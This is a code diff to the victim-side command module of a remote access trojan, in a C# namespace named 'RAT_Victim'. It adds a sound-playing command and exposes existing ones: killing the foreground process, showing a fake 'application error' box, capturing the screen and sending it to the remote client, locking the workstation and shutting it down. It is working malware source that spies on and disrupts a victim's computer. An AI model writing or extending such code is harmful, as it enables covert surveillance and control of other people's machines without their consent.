@@ -1,19 +1,18 @@
 ﻿using System.Diagnostics;
-using System.Diagnostics.CodeAnalysis;
 using System.Drawing;
+using System.IO;
+using System.Media;
 using System.Text;
 using System.Windows.Forms;
 
-#pragma warning disable IDE0051 // Remove unused private members
-
 namespace RAT_Victim
 {
-    [SuppressMessage("ReSharper", "UnusedMember.Local")]
     internal static class Commands
     {
         private static readonly ImageConverter Converter = new ImageConverter();
+        private static readonly SoundPlayer Player = new SoundPlayer();
 
-        private static void CloseActiveWindow()
+        internal static void CloseActiveWindow()
         {
             var window = PInvoke.GetForegroundWindow();
             PInvoke.GetWindowThreadProcessId(window, out var processId);
@@ -21,7 +20,7 @@ namespace RAT_Victim
             PInvoke.TerminateProcess(process, 0);
         }
 
-        private static void ShowMessageBox()
+        internal static void ShowMessageBox()
         {
             var window = PInvoke.GetForegroundWindow();
             PInvoke.MessageBox(window,
@@ -29,7 +28,7 @@ namespace RAT_Victim
                 GetActiveWindowTitle() + " - Ошибка приложения", 0x10);
         }
 
-        private static void TakeScreenshot()
+        internal static void TakeScreenshot()
         {
             var screenSize = Screen.PrimaryScreen.Bounds.Size;
             var bitmap = new Bitmap(screenSize.Width, screenSize.Height);
@@ -39,12 +38,12 @@ namespace RAT_Victim
             if (data != null) Program.Client.Send(data);
         }
 
-        private static void Lock()
+        internal static void Lock()
         {
             PInvoke.LockWorkStation();
         }
 
-        private static void Shutdown()
+        internal static void Shutdown()
         {
             var process = new Process
             {
@@ -62,9 +61,15 @@ namespace RAT_Victim
             return builder.ToString();
         }
 
-        public static void ShowMessage(string message)
+        public static void SendMessage(string message)
         {
             PInvoke.MessageBox(PInvoke.GetForegroundWindow(), message, GetActiveWindowTitle(), 0x40);
+        }
+
+        public static void PlaySound(Stream audioStream)
+        {
+            Player.Stream = audioStream;
+            Player.Play();
         }
     }
 }
